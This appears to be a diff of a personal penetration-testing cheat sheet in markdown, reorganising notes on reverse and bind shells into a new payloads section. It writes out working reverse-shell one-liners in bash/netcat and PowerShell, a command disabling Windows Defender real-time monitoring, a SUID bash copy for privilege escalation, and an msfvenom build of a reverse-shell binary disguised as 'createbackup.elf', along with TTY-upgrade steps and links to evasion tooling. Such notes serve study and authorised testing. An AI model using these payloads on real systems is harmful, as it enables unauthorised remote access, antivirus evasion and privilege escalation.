@@ -2015,22 +2015,6 @@ With a `reverse shell`, the attack box will have a listener running, and the tar
 
 You want to use a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) like `443` which usually is for `HTTPS` connections, so that it does not  get blocked by firewalls.
 
-### One=liners
-
-- Netcat/Bash
-
-  ```
-  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [YOUR_IP] [PORT] > /tmp/f
-  ```
-
-- Poweshell
-
-  ```powershell
-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-  ```
-
-  
-
 ### Firewall evasion Windows
 
 - Disable Windows Defender antivirus (AV)
@@ -2038,9 +2022,6 @@ You want to use a [common port](https://docs.redhat.com/en/documentation/red_hat
   ```powershell
    Set-MpPreference -DisableRealtimeMonitoring $true
   ```
-
-  
-
 
 
 ## Bind Shell
@@ -2062,38 +2043,6 @@ We can use `netcat` to connect to that port and get a connection to the shell. U
    ```
 
    
-
-## TTY Upgrade
-
-Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
-
-It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.
-
-### General method
-
-```bash
-script -qc /bin/bash /dev/null
-```
-
-
-
-### python/stty method
-
-```bash
-# In reverse shell
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
-Ctrl-Z	# Go to my Kali
-
-# In Kali
-$ stty raw -echo
-$ fg	# Go to shell
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
-$ stty rows [] columns []
-```
 
 ## Web Shell
 
@@ -2155,7 +2104,25 @@ Contra:
 
 - Not as interactive
 
-### Payload 
+## Payloads
+
+`Staged` payloads create a way for us to send over more components of our attack
+
+Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a `stageless` payload. Stageless payloads can sometimes be better for evasion purposes.
+
+### One liners
+
+- **Netcat/Bash**
+
+  ```
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [YOUR_IP] [PORT] > /tmp/f
+  ```
+
+- **Poweshell**
+
+  ```powershell
+  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  ```
 
 - **Bash**
 
@@ -2164,6 +2131,75 @@ Contra:
   ```bash
   echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
   ```
+
+- **MSFvenom**
+
+  ```bash
+  # List payloads
+  msfvenom -l payloads
+  
+  # Build a stageless payload (-f to specify the format)
+  msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT=444 -f elf > createbackup.elf
+  ```
+
+  
+
+### Windows 
+
+#### Types of payloads
+
+- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library): library file to provide shared code and data that can be used by different programs at once. Can elevate our privileges to SYSTEM and/or bypass User  Account Controls.
+
+- [Batch](https://commandwindows.com/batch.htm): text-based DOS scripts (`.bat` extension) utilized by system administrators to complete multiple tasks through the command-line interpreter.  We can use batch files to run commands on the host in an automated fashion. 
+
+- [VBS](https://www.guru99.com/introduction-to-vbscript.html): scripting language typically used as a client-side scripting language  in webservers to enable dynamic web pages. Now outdated, it is used in phishing attacks.
+
+- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) When attempting to install a new application, the installer will look for the `.msi` file. Once we loaded the payload, we can run `msiexec` to execute our file.
+
+- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1): shell environment and scripting language.
+
+#### Resources
+
+- MSFVenom
+- [Alternative to metasploit](https://github.com/its-a-feature/Mythic)
+- [PayloafAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [Nishang ](https://github.com/samratashok/nishang) is a framework collection of Offensive PowerShell implants and  scripts. 
+- [Darkarmour](https://github.com/bats3c/darkarmour) is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
+- [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with  network protocols directly. Some of the most exciting tools we care  about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
+
+### Linux
+
+
+
+### TTY Upgrade
+
+Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
+
+It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.
+
+#### General method
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+#### python/stty method
+
+```bash
+# In reverse shell
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
+Ctrl-Z	# Go to my Kali
+
+# In Kali
+$ stty raw -echo
+$ fg	# Go to shell
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows [] columns []
+```
 
 
 
